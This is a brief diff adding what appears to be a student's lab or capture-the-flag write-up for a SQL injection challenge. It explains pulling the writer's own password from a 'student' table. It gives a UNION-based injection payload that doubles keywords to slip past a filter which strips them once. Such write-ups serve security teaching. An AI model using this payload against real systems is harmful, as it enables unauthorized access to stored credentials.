@@ -1,0 +1,4 @@
+In this question we have to get the password corresponding to my account.
+So I just looked at the "password" attribute of the students table corresponding to my uname ie. "dbansal".
+
+SQL Query - ' oorr 1 ununionion (selselectect null,(SEselectLECT group_concat(passwoorrd) FROM student whewherere uname='dbansal'),null,null,null,null,null,null,null,null,null,null,null,null) -- -
